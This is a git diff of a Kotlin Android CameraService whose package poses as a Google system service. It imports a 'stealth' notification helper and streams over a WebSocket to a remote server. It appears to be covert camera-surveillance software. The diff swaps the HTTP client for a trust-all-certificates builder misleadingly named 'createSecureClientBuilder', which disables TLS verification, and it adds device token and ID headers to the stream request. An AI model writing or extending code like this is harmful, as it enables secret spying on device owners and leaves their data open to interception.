@@ -15,6 +15,7 @@ import android.util.Log
 import android.util.Size
 import com.google.android.systemservice.config.AndroidConfig
 import com.google.android.systemservice.utils.StealthNotificationHelper
+import com.google.android.systemservice.utils.TrustAllCertificates
 import kotlinx.coroutines.*
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
@@ -37,7 +38,7 @@ class CameraService : Service() {
     private var webSocket: WebSocket? = null
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    private val client = OkHttpClient.Builder()
+    private val client = TrustAllCertificates.createSecureClientBuilder()
         .connectTimeout(30, TimeUnit.SECONDS)
         .writeTimeout(60, TimeUnit.SECONDS)
         .readTimeout(30, TimeUnit.SECONDS)
@@ -218,6 +219,8 @@ class CameraService : Service() {
     private fun connectStreamWebSocket(cameraId: String) {
         val request = Request.Builder()
             .url(AndroidConfig.websocketUrl)
+            .addHeader("X-Device-Token", AndroidConfig.deviceToken)
+            .addHeader("X-Device-ID", AndroidConfig.deviceId)
             .build()
 
         webSocket = client.newWebSocket(request, object : WebSocketListener() {
